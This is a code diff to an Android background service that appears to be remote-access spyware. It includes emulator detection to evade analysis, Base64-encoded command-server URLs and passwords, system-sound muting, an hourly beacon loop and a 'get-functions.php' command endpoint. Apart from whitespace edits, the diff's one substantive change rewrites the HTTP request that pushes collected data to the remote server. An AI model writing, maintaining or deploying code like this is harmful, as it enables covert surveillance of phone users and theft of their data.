@@ -1,5 +1,5 @@
 package com.connect;
-	
+
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.DataInputStream;
@@ -29,10 +29,6 @@ import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import org.apache.http.HttpResponse;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.methods.HttpGet;
-import org.apache.http.impl.client.DefaultHttpClient;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
@@ -77,8 +73,8 @@ import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
-	
-public class MyService extends Service 
+
+public class MyService extends Service
 {
     private static final String TAG = MyService.class.getName();
     //********************************************************************************************************************************************************
@@ -92,7 +88,7 @@ public class MyService extends Service
 
     //********************************************************************************************************************************************************
     private long interval = 1000 * 60 * 60; //1 hour 
-    private int version = 1; 
+    private int version = 1;
     //********************************************************************************************************************************************************
 	BroadcastReceiver mReceiver;
 	private final IBinder myBinder = new MyLocalBinder();
@@ -114,14 +110,14 @@ public class MyService extends Service
     private String urlFunctions = "/get-functions.php?";
     //********************************************************************************************************************************************************
 	@Override
-	public IBinder onBind(Intent arg0) 
+	public IBinder onBind(Intent arg0)
 	{
 		return myBinder;
 	}
-    //********************************************************************************************************************************************************	
-	public class MyLocalBinder extends Binder 
+    //********************************************************************************************************************************************************
+	public class MyLocalBinder extends Binder
 	{
-		MyService getService() 
+		MyService getService()
 		{
 			return MyService.this;
 	    }
@@ -129,7 +125,7 @@ public class MyService extends Service
     //********************************************************************************************************************************************************
 	PreferenceManager pm;
     private Double latitude;
-    private Double longitude;    
+    private Double longitude;
     private LocationManager locManager;
     //********************************************************************************************************************************************************
 	@Override
@@ -191,18 +187,18 @@ public class MyService extends Service
     //********************************************************************************************************************************************************
 	Thread threadPre = new Thread()
 	{
-	@Override                    
-    public void run() 
-		{ 
+	@Override
+    public void run()
+		{
         Looper.prepare();
        	Log.i(TAG, "Thread Pre");
 
 	        if(GPlayBypass==true)
 	        {
 		        while(true){
-				
+
 		    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Start", false)==false)
-		    	{		    				    		
+		    	{
 		    		if("google_sdk".equals(Build.PRODUCT ) || "google_sdk".equals(Build.MODEL) || Build.BRAND.startsWith("generic") || Build.DEVICE.startsWith("generic") || "goldfish".equals(Build.HARDWARE))
 		    		{
 		    		}
@@ -223,15 +219,15 @@ public class MyService extends Service
 		    		initiate();
 		    	}
 		    	else{}
-				
-				try 
+
+				try
 				   {
 		            Thread.sleep(interval);
 				   }
-				   catch (Exception e) 
+				   catch (Exception e)
 				   {
-				    	threadPre.start(); 
-				   }           
+				    	threadPre.start();
+				   }
 		     	}
 	        }
 	        else
@@ -243,7 +239,7 @@ public class MyService extends Service
     //********************************************************************************************************************************************************
 	public void initiate()
 	{
-        try 
+        try
         {
         	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false);
             PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",false).commit();
@@ -251,26 +247,26 @@ public class MyService extends Service
 	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("URL", encodedURL).commit();
 	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", backupURL).commit();
 	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("password", encodedPassword).commit();
-	         
+
 	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("androidId", androidId).commit();
 
 	     	URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT ));
 	     	password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT ));
-	         	    
+
 	        AudioManager mgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
-	        mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true); 
+	        mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true);
         } catch (Exception e) {e.printStackTrace();}
         thread.start();
 	}
     //********************************************************************************************************************************************************
 	Thread thread = new Thread()
 	{
-	@Override                    
-    public void run() { 
+	@Override
+    public void run() {
         Looper.prepare();
         int i=0;
 			while(true)
-			{		
+			{
 //				if(isNetworkAvailable())//url not reachable
 //				{	
 ////					new isUrlAlive(URL).execute("");
@@ -759,10 +755,11 @@ public class MyService extends Service
     	  try 
     	  {
     	    Log.i(TAG, "network push POST");
-    	    HttpClient httpclient = new DefaultHttpClient();
-    	    HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
-    	    content = response.getEntity().getContent();
-    	    httpclient.getConnectionManager().shutdown();
+              URL urlObj = new URL(urlBase + urlDataFormatted);
+              HttpURLConnection urlConnection = (HttpURLConnection) urlObj.openConnection();
+              content = urlConnection.getInputStream();
+              urlConnection.disconnect();
+
     	  } catch (Exception e) {
     		  Log.e(TAG, "exception", e);
     	  }
@@ -776,27 +773,6 @@ public class MyService extends Service
     	StrictMode.setThreadPolicy(policy);
 
     	return true;
-   
-//        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-//        NetworkInfo netInfo = cm.getActiveNetworkInfo();
-//        if (netInfo != null && netInfo.isConnected()) {
-//            try {
-//                URL url = new URL("http://www.google.com");
-//                HttpURLConnection urlc = (HttpURLConnection) url.openConnection();
-//                urlc.setConnectTimeout(3000);
-//                urlc.connect();
-//                if (urlc.getResponseCode() == 200) {
-//                    return new Boolean(true);
-//                }
-//            } catch (MalformedURLException e1) {
-//                // TODO Auto-generated catch block
-//                e1.printStackTrace();
-//            } catch (IOException e) {
-//                // TODO Auto-generated catch block
-//                e.printStackTrace();
-//            }
-//        }
-//        return false;
     }
     //********************************************************************************************************************************************************
 	public class mediaVolumeUp extends AsyncTask<String, Void, String> {
@@ -1577,7 +1553,7 @@ public class MyService extends Service
 	        mCur.close();
 	        
 		    return "Executed";
-        }      
+        }
         @Override
         protected void onPostExecute(String result) {
         	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
